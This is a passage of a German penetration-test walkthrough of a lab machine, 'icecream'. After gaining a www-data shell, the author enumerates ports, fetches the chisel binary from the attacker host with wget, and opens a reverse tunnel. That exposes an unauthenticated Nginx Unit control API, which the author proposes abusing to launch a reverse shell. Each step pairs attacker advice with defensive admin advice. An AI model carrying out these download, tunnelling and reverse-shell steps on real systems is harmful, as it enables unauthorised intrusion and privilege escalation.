+                - Isolieren Sie das betroffene System sofort vom Netzwerk, um weitere laterale Bewegungen oder Datenexfiltration zu verhindern.
+                - Identifizieren und beenden Sie den bösartigen Prozess, der die Reverse Shell aufrechterhält.
+                - Beginnen Sie mit der forensischen Analyse, um den ursprünglichen Angriffsvektor (hier die unsichere SMB- und Webserver-Konfiguration) zu identifizieren und zu schließen.
+                - Überprüfen Sie das System gründlich auf Persistenzmechanismen, die der Angreifer möglicherweise eingerichtet hat (z.B. Cronjobs, neue Benutzer, SSH-Keys).
+            </p>
+        </section>
+
+        <section id="internal-service-discovery">
+            <h2>Interne Service Discovery & Port Forwarding</h2>
+            <p class="comment">
+                Nachdem ich eine Shell als `www-data` auf dem Zielsystem `icecream` erlangt habe, führe ich eine lokale Portübersicht durch. Ziel ist es, Dienste zu identifizieren, die möglicherweise nur vom Localhost (`127.0.0.1`) oder aus dem internen Netzwerk erreichbar sind und die bei den externen Nmap-Scans nicht sichtbar waren. Solche Dienste können weitere Angriffsvektoren oder Wege zur Privilegienerweiterung bieten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ss -altpn</span></div>
+                    <pre>
+State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port Process                         
+LISTEN 0      4096           <span class="command">0.0.0.0:9000</span>        0.0.0.0:*                                    
+LISTEN 0      128            <span class="command">0.0.0.0:22</span>          0.0.0.0:*                                    
+LISTEN 0      511            <span class="command">0.0.0.0:80</span>          0.0.0.0:*     users:(("nginx",pid=508,fd=5)) 
+LISTEN 0      50             <span class="command">0.0.0.0:139</span>         0.0.0.0:*                                    
+LISTEN 0      50             <span class="command">0.0.0.0:445</span>         0.0.0.0:*                                    
+LISTEN 0      128               <span class="command">[::]:22</span>             [::]:*                                    
+LISTEN 0      511               <span class="command">[::]:80</span>             [::]:*     users:(("nginx",pid=508,fd=6)) 
+LISTEN 0      50                <span class="command">[::]:139</span>            [::]:*                                    
+LISTEN 0      50                <span class="command">[::]:445</span>            [::]:*
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ss -altpn` wird in der Shell auf der `icecream`-Maschine ausgeführt, um alle lauschenden TCP-Sockets aufzulisten.
+                - `ss`: Socket Statistics, ein Nachfolger von `netstat`.
+                - `-a`: Zeigt alle Sockets an (lauschende und nicht-lauschende).
+                - `-l`: Zeigt nur lauschende Sockets an.
+                - `-t`: Zeigt nur TCP-Sockets an.
+                - `-p`: Zeigt die Prozesse an, die die Sockets verwenden.
+                - `-n`: Zeigt numerische Adressen und Portnummern an (keine DNS- oder Service-Namensauflösung).
+
+                Die Ausgabe bestätigt die bereits von den externen Nmap-Scans gefundenen Dienste, die auf allen Schnittstellen (`0.0.0.0` für IPv4, `[::]` für IPv6) lauschen:
+                - Port `9000` (Prozess nicht direkt ersichtlich, aber als `cslistener?` von Nmap vermutet).
+                - Port `22` (SSH).
+                - Port `80` (HTTP, von `nginx` mit PID 508 verwendet).
+                - Ports `139` und `445` (NetBIOS/SMB).
+                Es werden keine neuen, nur intern auf `127.0.0.1` lauschenden TCP-Dienste aufgedeckt, die für eine direkte Port-Weiterleitung zur Umgehung von Netzwerk-Firewalls zwingend erforderlich wären. Der interessante Port `9000` ist bereits von extern erreichbar.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der `ss`-Befehl bestätigt die extern sichtbaren Dienste und zeigt keine zusätzlichen, versteckten TCP-Dienste, die nur lokal erreichbar wären. Dies bedeutet, dass der Fokus für weitere Angriffe auf den bereits bekannten Diensten liegen muss, insbesondere auf dem noch nicht vollständig verstandenen Dienst auf Port 9000 und dem Webserver auf Port 80. Obwohl keine *neuen* internen Dienste gefunden wurden, die eine Port-Weiterleitung zwingend erfordern würden, kann Port-Weiterleitung dennoch nützlich sein, um Tools von meiner Angreifer-Maschine direkt und komfortabler gegen den Dienst auf Port 9000 zu verwenden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Da Port 9000 extern erreichbar ist und noch nicht klar ist, welcher Dienst dort genau läuft, muss dieser weiter untersucht werden.
+                - Um die Interaktion mit dem Dienst auf Port 9000 zu erleichtern und Tools von meiner Angreifer-Maschine (z.B. Browser, spezialisierte Clients) nutzen zu können, werde ich eine Port-Weiterleitung mit `chisel` einrichten. Dies tunnelt den Verkehr von einem lokalen Port auf meiner Angreifer-Maschine zu Port 9000 auf der Zielmaschine.
+                <br>
+                **Empfehlung (Admin):**
+                Überprüfen Sie regelmäßig die lauschenden Ports auf Ihren Systemen mit Tools wie `ss` oder `netstat`, um sicherzustellen, dass nur notwendige Dienste aktiv sind und auf den korrekten Netzwerkschnittstellen lauschen (z.B. `127.0.0.1` für rein lokale Dienste, spezifische IPs für Dienste, die nicht auf allen Schnittstellen verfügbar sein müssen). Dokumentieren Sie den Zweck jedes lauschenden Dienstes.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls /home/</span></div>
+                    <pre>
+<span class="command">ice</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ls /home/` wird in der Shell auf `icecream` ausgeführt und listet die Benutzerverzeichnisse im `/home`-Verzeichnis auf. Es wird ein einziges Verzeichnis und somit ein Benutzer namens `ice` angezeigt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies bestätigt den bereits durch `enum4linux` (via SID-Enumeration) gefundenen Benutzer `Unix User\ice`. Es ist sehr wahrscheinlich, dass dies der Hauptbenutzer des Systems ist und das Erlangen von Rechten dieses Benutzers ein wichtiger Schritt in Richtung Root wäre oder zumindest den Zugriff auf sensiblere Daten ermöglichen könnte (z.B. User-Flag, SSH-Keys, Konfigurationsdateien).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Als `www-data` habe ich wahrscheinlich keine direkten Leserechte auf `/home/ice`. Dies sollte jedoch überprüft werden (`ls -la /home/ice`). Suchen Sie nach Möglichkeiten, die Rechte auf den Benutzer `ice` zu eskalieren oder Informationen aus seinem Kontext zu erlangen (z.B. durch Ausnutzung von Fehlkonfigurationen oder Diensten, die als `ice` laufen).
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse restriktiv sind (üblicherweise `drwx------` oder `700`), sodass nur der jeweilige Benutzer und der Root-Benutzer darauf zugreifen können. Dies verhindert, dass andere Benutzer, einschließlich Dienstbenutzer wie `www-data` (falls kompromittiert), auf private Benutzerdaten zugreifen können.
+            </p>
+
+            <p class="comment">
+                Um den Dienst auf Port 9000 genauer untersuchen zu können und die Interaktion zu erleichtern, werde ich nun `chisel` verwenden. `chisel` ist ein schnelles TCP/UDP-Tunneling-Tool, das über HTTP funktioniert und durch Firewalls tunneln kann. Ich werde einen Chisel-Server auf meiner Angreifer-Maschine starten und einen Chisel-Client auf der Zielmaschine (`icecream`), um den Port 9000 des Ziels auf einen lokalen Port meiner Angreifermaschine weiterzuleiten. Dies ermöglicht es mir, mit Tools von meiner Maschine (z.B. einem Webbrowser oder spezialisierten Clients) direkt auf den Dienst auf Port 9000 zuzugreifen, als ob er lokal auf meiner Maschine liefe.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cd Hackingtools/chisel</span></div>
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 8740
+-rwsrwsr-x 1 ccat ccat 8945816 25. Aug 00:43 <span class="command">chisel</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Auf meiner Angreifer-Maschine (Kali Linux, Prompt `root@CCat`) navigiere ich in das Verzeichnis `~/Hackingtools/chisel`, in dem sich meine `chisel`-Binärdatei befindet. Der Befehl `ll` (ein gängiger Alias für `ls -alh` oder `ls -l`) zeigt die `chisel`-Binärdatei an. Sie ist 8.7MB groß und hat Ausführungsrechte. Die SUID- und SGID-Bits (`-rwsrwsr-x`) sind hier auf meiner lokalen `chisel`-Datei gesetzt, was unüblich ist und für die Funktion von Chisel als Client oder Server nicht zwingend erforderlich ist; es ist wahrscheinlicher ein Artefakt davon, wie ich die Datei auf mein System bekommen habe oder lokale Testeinstellungen. Für die hier geplante Nutzung ist nur das Ausführungsrecht relevant.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein vorbereitender Schritt auf meiner Angreifer-Maschine, um `chisel` nutzen zu können. Die lokalen Dateiberechtigungen von `chisel` auf meiner Maschine sind für die Funktion des Tunnelings nicht kritisch, solange die Datei ausführbar ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Der nächste Schritt ist, einen Weg zu finden, die `chisel`-Binärdatei auf die Zielmaschine (`icecream`) zu übertragen, da sie dort als Client ausgeführt werden muss. Übliche Methoden sind das Hosten der Datei auf einem einfachen HTTP-Server auf der Angreifer-Maschine und der Download mittels `wget` oder `curl` auf dem Zielsystem, oder die Übertragung über den bereits bestehenden SMB-Zugriff, falls Schreibrechte bestehen.
+                <br>
+                **Empfehlung (Admin):**
+                Das Vorhandensein und die Ausführung von Port-Forwarding-Tools wie `chisel` auf einem kompromittierten System sind klare Indikatoren für fortgeschrittene Angriffsaktivitäten. Die Überwachung von Netzwerkverkehr auf ungewöhnliche Tunneling-Protokolle (obwohl Chisel HTTP-basiert ist und sich tarnen kann) und das Härten von Systemen, um das Hochladen und Ausführen solcher nicht autorisierter Tools zu verhindern, sind wichtige Verteidigungsmaßnahmen. Dateisystem-Monitoring auf neu erstellte ausführbare Dateien in temporären Verzeichnissen kann ebenfalls helfen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Auf meiner Angreifer-Maschine starte ich einen einfachen Python-HTTP-Server im aktuellen Verzeichnis (`~/Hackingtools/chisel`), der auf Port 80 lauscht. Der Befehl `python3 -m http.server 80` ist eine schnelle Methode, um Dateien aus dem aktuellen Verzeichnis über HTTP bereitzustellen. Da sich meine `chisel`-Binärdatei in diesem Verzeichnis befindet, kann sie nun von anderen Systemen im Netzwerk über `http://<IP_Angreifer>:80/chisel` heruntergeladen werden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist eine gängige und effektive Methode, um schnell und unkompliziert Dateien von der Angreifer-Maschine auf ein Zielsystem zu übertragen, vorausgesetzt, das Zielsystem hat Netzwerkzugriff auf die Angreifer-Maschine und verfügt über ein Download-Tool wie `wget` oder `curl`. Port 80 wird oft gewählt, da er seltener durch Firewalls blockiert wird als höhere Ports.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nachdem der HTTP-Server auf meiner Angreifer-Maschine gestartet wurde, wechsle ich zur Shell auf der Zielmaschine (`www-data@icecream`) und verwende dort `wget` oder `curl`, um die `chisel`-Binärdatei aus dem `/tmp`-Verzeichnis (oder einem anderen beschreibbaren Verzeichnis) herunterzuladen.
+                <br>
+                **Empfehlung (Admin):**
+                Beschränken Sie die Möglichkeit für Prozesse mit niedrigen Berechtigungen (wie `www-data`), beliebige Dateien aus dem Netzwerk herunterzuladen und auszuführen. Dies kann durch Netzwerk-Firewall-Regeln (Egress-Filter, die ausgehende Verbindungen einschränken), Host-basierte Firewalls oder durch Richtlinien erreicht werden, die die Verwendung von Download-Tools wie `wget` oder `curl` durch bestimmte Benutzer oder Prozesse einschränken. Überwachen Sie das Netzwerk auf unerwartete HTTP-Verbindungen von Servern zu internen Client-IPs.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">wget 192.168.2.199/chisel</span></div>
+                    <pre>
+--2024-10-09 14:04:40--  http://192.168.2.199/chisel
+Connecting to 192.168.2.199:80... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 8945816 (8.5M) [application/octet-stream]
+Saving to: ‘chisel’
+
+chisel                  100%[=============================>]   8.53M  --.-KB/s    in 0.07s   
+
+<span class="password">2024-10-09 14:04:40 (119 MB/s) - ‘chisel’ saved [8945816/8945816]</span>
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.131 - - [09/Oct/2024 14:04:36] "GET /chisel HTTP/1.1" 200 -</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                In der ersten Codebox wird auf der Zielmaschine (`www-data@icecream` im Verzeichnis `/tmp`) der Befehl `wget 192.168.2.199/chisel` ausgeführt. Dies initiiert den Download der `chisel`-Binärdatei vom Python-HTTP-Server, der auf meiner Angreifer-Maschine (`192.168.2.199`) auf Port 80 läuft.
+                Die Ausgabe von `wget` bestätigt den erfolgreichen Download: Verbindung hergestellt, HTTP-Antwort `200 OK` erhalten, und die 8.5MB große Datei wurde als `chisel` im aktuellen Verzeichnis (`/tmp`) gespeichert.
+                Die zweite Codebox zeigt die korrespondierende Log-Ausgabe des Python-HTTP-Servers auf meiner Angreifer-Maschine. Sie bestätigt den `GET /chisel HTTP/1.1`-Request von der IP-Adresse der Zielmaschine (`192.168.2.131`) und den erfolgreichen Statuscode `200`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der Transfer der `chisel`-Binärdatei auf die Zielmaschine war erfolgreich. Dies ist ein notwendiger Schritt, um `chisel` als Client auf dem Zielsystem ausführen und den Port-Forwarding-Tunnel zu meinem Chisel-Server aufbauen zu können. Die hohe Übertragungsgeschwindigkeit (119 MB/s) deutet auf eine gute Netzwerkverbindung im lokalen Testnetz hin.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nach dem erfolgreichen Download ist der nächste Schritt, die heruntergeladene `chisel`-Datei auf dem Zielsystem ausführbar zu machen, falls sie es nicht bereits ist (typischerweise mit `chmod +x chisel`). Danach kann der Chisel-Client gestartet werden, um die Verbindung zum Chisel-Server aufzubauen.
+                <br>
+                **Empfehlung (Admin):**
+                Wie bereits erwähnt, ist die Überwachung und Einschränkung von Downloads und der Ausführung nicht autorisierter Software aus temporären Verzeichnissen eine wichtige Verteidigungsmaßnahme. Dateisystem-Auditing kann helfen, das Erstellen neuer ausführbarer Dateien in `/tmp` zu protokollieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">chmod +x chisel</span></div>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `chmod +x chisel` wird in der Shell auf der Zielmaschine (`www-data@icecream` im Verzeichnis `/tmp`) ausgeführt. Dieser Befehl fügt der Datei `chisel` das Ausführungsrecht hinzu. Es gibt keine direkte Ausgabe, was bei einem erfolgreichen `chmod`-Befehl normal ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein einfacher, aber essenzieller Schritt. Ohne Ausführungsrechte könnte die `chisel`-Binärdatei auf dem Zielsystem nicht gestartet werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nachdem `chisel` nun ausführbar ist, kann der Chisel-Server auf der Angreifer-Maschine gestartet werden (falls noch nicht geschehen) und anschließend der Chisel-Client auf der Zielmaschine, um den Tunnel für Port 9000 einzurichten.
+                <br>
+                **Empfehlung (Admin):**
+                Die Überwachung der Ausführung von Dateien aus temporären Verzeichnissen wie `/tmp` (z.B. durch `execve`-Syscall-Auditing) kann helfen, solche Aktivitäten zu erkennen, auch wenn das Setzen des Ausführungs-Bits selbst nicht immer verdächtig ist. Das Prinzip der geringsten Rechte sollte auch hier gelten: Der Benutzer `www-data` sollte idealerweise keine beliebigen Programme in `/tmp` ausführen dürfen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">./chisel server --reverse -p 1234</span></div>
+                    <pre>
+<span class="password">2024/10/09 14:05:31 server: Reverse tunnelling enabled</span>
+2024/10/09 14:05:31 server: Fingerprint xWqrKZVJn5jbDloSEetZKIAuqA/nDMOIooK4jyyusjk=
+<span class="password">2024/10/09 14:05:31 server: Listening on http://0.0.0.0:1234</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Auf meiner Angreifer-Maschine (`root@CCat`) wird der `chisel`-Server gestartet:
+                - `./chisel server`: Startet Chisel im Server-Modus.
+                - `--reverse`: Aktiviert den Reverse-Tunneling-Modus. Dies ist wichtig, da das Zielsystem (hinter einer potenziellen Firewall oder NAT) die Verbindung zu meinem Server initiiert. Mein Server kann dann dem Client anweisen, Ports weiterzuleiten.
+                - `-p 1234`: Der Chisel-Server lauscht auf Port `1234` auf eingehende Client-Verbindungen von der Zielmaschine.
+                Die Server-Ausgabe bestätigt, dass Reverse Tunnelling aktiviert ist, zeigt einen Fingerprint (für eine sicherere Verbindung, falls gewünscht) und meldet, dass er auf `http://0.0.0.0:1234` auf Verbindungen wartet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der Chisel-Server auf meiner Angreifer-Maschine ist nun korrekt eingerichtet und bereit, Verbindungen vom Chisel-Client auf der Zielmaschine `icecream` entgegenzunehmen. Der Reverse-Modus ist hier entscheidend, da er es dem Client ermöglicht, die Tunnelkonfiguration zu steuern.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nachdem der Server läuft, ist der nächste Schritt, den Chisel-Client auf der Zielmaschine (`www-data@icecream`) zu starten und ihn anzuweisen, sich mit diesem Server zu verbinden und die gewünschte Port-Weiterleitung (Port 9000 des Ziels zu einem lokalen Port auf meiner Maschine) einzurichten.
+                <br>
+                **Empfehlung (Admin):**
+                Firewall-Regeln (Egress-Filter) auf dem Zielsystem könnten ausgehende Verbindungen zu unbekannten oder nicht autorisierten Ports wie `1234` blockieren oder protokollieren. Die Überwachung auf verdächtige Netzwerkverbindungen, insbesondere zu externen IPs auf ungewöhnlichen Ports, ist eine wichtige Verteidigungsmaßnahme.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">./chisel client 192.168.2.199:1234 R:9000:192.168.2.131:9000</span></div>
+                    <pre>
+<span class="password">2024/10/09 14:06:33 client: Connecting to ws://192.168.2.199:1234</span>
+<span class="password">2024/10/09 14:06:33 client: Connected (Latency 312.245µs)</span>
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">./chisel server --reverse -p 1234</span></div>
+                    <pre>
+2024/10/09 14:05:31 server: Reverse tunnelling enabled
+2024/10/09 14:05:31 server: Fingerprint xWqrKZVJn5jbDloSEetZKIAuqA/nDMOIooK4jyyusjk=
+2024/10/09 14:05:31 server: Listening on http://0.0.0.0:1234
+<span class="password">2024/10/09 14:06:29 server: session#1: tun: proxy#R:9000=>192.168.2.131:9000: Listening</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                In der ersten Codebox wird auf der Zielmaschine (`www-data@icecream` im Verzeichnis `/tmp`) der `chisel`-Client gestartet:
+                - `./chisel client 192.168.2.199:1234`: Der Client wird angewiesen, sich mit dem Chisel-Server auf meiner Angreifer-Maschine (IP `192.168.2.199`, Port `1234`) zu verbinden.
+                - `R:9000:192.168.2.131:9000`: Dies ist die entscheidende Port-Weiterleitungsregel im Reverse-Modus.
+                    - Das erste `R` signalisiert eine "Remote"-Weiterleitung, d.h. der *Server* (meine Angreifer-Maschine) soll auf einem Port lauschen.
+                    - Der erste `9000`: Dies ist der Port, auf dem der Chisel-Server (auf meiner Angreifer-Maschine) lauschen wird. Anfragen an `localhost:9000` auf meiner Maschine werden dann weitergeleitet.
+                    - `192.168.2.131:9000`: Dies ist der Ziel-Host und -Port auf der Zielmaschine (`icecream`), zu dem der eingehende Traffic auf meinem lokalen Port 9000 getunnelt werden soll.
+                Der Client meldet `Connected (Latency 312.245µs)`, was die erfolgreiche Verbindung zum Server bestätigt.
+
+                Die zweite Codebox zeigt die korrespondierende Ausgabe des Chisel-Servers auf meiner Angreifer-Maschine. Zusätzlich zu den Startmeldungen sehen wir nun:
+                - `2024/10/09 14:06:29 server: session#1: tun: proxy#R:9000=>192.168.2.131:9000: Listening`: Diese Meldung bestätigt, dass der Tunnel aktiv ist. Der Chisel-Server hat vom Client die Anweisung erhalten und lauscht nun auf *seinem* lokalen Port 9000 (also `localhost:9000` auf meiner Angreifer-Maschine) und wird allen Traffic, der dort ankommt, durch den Tunnel an Port 9000 der Zielmaschine `192.168.2.131` weiterleiten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der Port-Forwarding-Tunnel mit Chisel wurde erfolgreich eingerichtet! Dies ist ein entscheidender Schritt, um den bisher nur vage identifizierten Dienst auf Port 9000 der Zielmaschine `icecream` komfortabel und mit allen Tools von meiner Angreifer-Maschine aus untersuchen zu können. Ich kann nun von meiner Angreifer-Maschine auf `http://localhost:9000` (oder `http://127.0.0.1:9000`) zugreifen, und diese Anfragen werden sicher an `192.168.2.131:9000` weitergeleitet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Greifen Sie nun von Ihrer Angreifer-Maschine mit einem Webbrowser oder anderen geeigneten Tools (z.B. `curl`, spezialisierte API-Clients, Burp Suite) auf `http://localhost:9000` (oder `http://127.0.0.1:9000`) zu, um den Dienst, der auf Port 9000 der Zielmaschine lauscht, detailliert zu untersuchen. Suchen Sie nach API-Endpunkten, Konfigurationsschnittstellen oder anderen Anzeichen für die Art und Funktionalität des Dienstes.
+                <br>
+                **Empfehlung (Admin):**
+                Wie bereits mehrfach erwähnt: Die Erkennung und Verhinderung von Tunneling-Software und verdächtigem Netzwerkverkehr (insbesondere ausgehende Verbindungen von Servern zu ungewöhnlichen Ports) sind wichtige Verteidigungsmaßnahmen. Überwachen Sie die Prozessaktivitäten auf Ihren Servern, um die Ausführung nicht autorisierter Binaries wie `chisel` zu erkennen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Browseranalyse:
+
+ <span class="command">192.168.2.199:9000</span>
+
+	
+certificates	{}
+js_modules	{}
+config	
+listeners	{}
+routes	[]
+applications	{}
+status	
+modules	
+python	
+version	"3.11.2"
+lib	"/usr/lib/unit/modules/python3.11.unit.so"
+php	
+version	"8.2.18"
+lib	"/usr/lib/unit/modules/php.unit.so"
+perl	
+version	"5.36.0"
+lib	"/usr/lib/unit/modules/perl.unit.so"
+ruby	
+version	"3.1.2"
+lib	"/usr/lib/unit/modules/ruby.unit.so"
+java	
+version	"17.0.11"
+lib	"/usr/lib/unit/modules/java17.unit.so"
+wasm	
+version	"0.1"
+lib	"/usr/lib/unit/modules/wasm.unit.so"
+wasm-wasi-component	
+version	"0.1"
+lib	"/usr/lib/unit/modules/wasm_wasi_component.unit.so"
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Diese Ausgabe ist das Ergebnis des Zugriffs auf den weitergeleiteten Port `9000` (also `http://localhost:9000` auf meiner Angreifer-Maschine) mit einem Webbrowser oder einem Tool wie `curl`. Die Formatierung (JSON-ähnlich) und der Inhalt deuten stark darauf hin, dass es sich um die Ausgabe der Nginx Unit Control API handelt.
+                Schlüsselinformationen aus der Ausgabe:
+                - Die Struktur mit Feldern wie `certificates`, `js_modules`, `config`, `listeners`, `routes`, `applications` und `status` ist charakteristisch für Nginx Unit.
+                - Der Abschnitt `modules` listet die verfügbaren Sprachmodule und deren Versionen auf, die Nginx Unit zur Ausführung von Anwendungen verwenden kann. Dazu gehören:
+                    - `python` (Version 3.11.2)
+                    - `php` (Version 8.2.18)
+                    - `perl` (Version 5.36.0)
+                    - `ruby` (Version 3.1.2)
+                    - `java` (Version 17.0.11)
+                    - `wasm` (WebAssembly)
+                    - `wasm-wasi-component`
+                Die Pfade zu den jeweiligen Modulbibliotheken (`.so`-Dateien im Verzeichnis `/usr/lib/unit/modules/`) werden ebenfalls angezeigt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein sehr wichtiger und aufschlussreicher Fund! Der bisher als `cslistener?` identifizierte Dienst auf Port 9000 ist die Control API des Nginx Unit Application Servers. Nginx Unit ist ein dynamischer Web- und Applikationsserver, der über eine JSON-API konfiguriert wird. Wenn diese API ungesichert ist (d.h. ohne Authentifizierung erreichbar und, noch wichtiger, modifizierbar), stellt dies eine massive Sicherheitslücke dar. Ein Angreifer könnte potenziell:
+                - Die aktuelle Konfiguration auslesen.
+                - Neue Listener oder Routen definieren.
+                - Eigene Anwendungen (z.B. in Python, PHP) hochladen oder definieren und ausführen lassen.
+                Die Tatsache, dass ich diese Informationen ohne Authentifizierung abrufen kann, deutet darauf hin, dass zumindest Lesezugriff auf die API ohne weiteres möglich ist. Die entscheidende Frage ist nun, ob auch Schreibzugriff (Konfigurationsänderungen) möglich ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Studieren Sie die offizielle Nginx Unit API-Dokumentation ([Link: https://unit.nginx.org/configuration/ | Ziel: https://unit.nginx.org/configuration/]), um zu verstehen, wie Konfigurationen gelesen und (wichtiger) geschrieben werden. Die API wird typischerweise über HTTP-Methoden wie GET (Lesen), PUT (Schreiben/Ersetzen) und DELETE (Löschen) auf spezifischen Pfaden wie `/config/`, `/config/listeners/`, `/config/applications/` angesprochen.
+                - Versuchen Sie, die aktuelle Konfiguration auszulesen, insbesondere unter `/config/`.
+                - **Prüfen Sie, ob Sie Konfigurationen ändern können (Schreibzugriff).** Versuchen Sie, eine einfache "Hello World"-Anwendung oder, besser noch, eine Anwendung, die Systembefehle ausführt oder eine Reverse Shell startet (z.B. ein einfaches Python-Flask- oder PHP-Skript), über die API zu definieren und zu laden. Da Nginx Unit oft mit erhöhten Rechten (manchmal sogar als `root` oder ein dedizierter, aber potenziell falsch konfigurierter Benutzer) läuft, könnte dies ein direkter Weg zur Privilegienerweiterung sein.
+                - Untersuchen Sie auch den `/status`-Endpunkt, der möglicherweise weitere nützliche Laufzeitinformationen liefert.
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend:** Sichern Sie die Nginx Unit Control API! Der Zugriff auf diese API (standardmäßig auf Port 8080, aber hier offensichtlich auf 9000 konfiguriert oder über einen Reverse Proxy dorthin geleitet) sollte streng auf vertrauenswürdige Hosts (idealerweise nur `localhost` oder ein dediziertes Management-Netzwerk) beschränkt und zusätzlich mit starker Authentifizierung (z.B. Client-Zertifikate oder HTTP Basic/Digest Auth über einen vorgeschalteten Proxy) versehen werden. Niemals sollte die Control API ungesichert im Netzwerk exponiert sein, insbesondere nicht im Internet.
+                - Überprüfen Sie die aktuelle Nginx Unit-Konfiguration auf verdächtige oder nicht autorisierte Anwendungen oder Einstellungen.
+                - Stellen Sie sicher, dass der Nginx Unit Prozess selbst mit den geringstmöglichen Rechten läuft, die für seine Funktion notwendig sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/python3.11.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 138600 Sep 17 23:42 /usr/lib/unit/modules/python3.11.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/php.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 81184 Sep 17 23:42 /usr/lib/unit/modules/php.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/perl.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 89104 Sep 17 23:43 /usr/lib/unit/modules/perl.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/ruby.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 93648 Sep 17 23:43 /usr/lib/unit/modules/ruby.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/java17.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 98304 Sep 17 23:44 /usr/lib/unit/modules/java17.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/wasm.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 76624 Sep 17 23:45 /usr/lib/unit/modules/wasm.unit.so</span></pre>
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/unit/modules/wasm_wasi_component.unit.so</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 10637728 Sep 17 23:45 /usr/lib/unit/modules/wasm_wasi_component.unit.so</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
